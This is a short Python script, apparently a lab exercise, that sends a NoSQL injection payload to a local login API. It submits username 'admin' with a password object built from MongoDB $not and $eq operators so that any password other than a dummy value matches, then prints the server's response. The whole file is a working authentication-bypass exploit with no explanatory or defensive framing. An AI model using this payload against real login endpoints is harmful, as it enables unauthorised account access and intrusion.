import requests
URL = "http://localhost:3000/api/login"
print("inyección NoSQL con $not + $eq")
print("-" * 50)
payload = {
    "username": "admin",
    "password": { "$not": { "$eq": "cualquierCosa" } }
}
print(payload)

resp = requests.post(URL, json=payload)
try:
    data = resp.json()
    print("Respuesta")
    print(data)
except:
    print("respuesta no válida del servidor")
print("-" * 50)




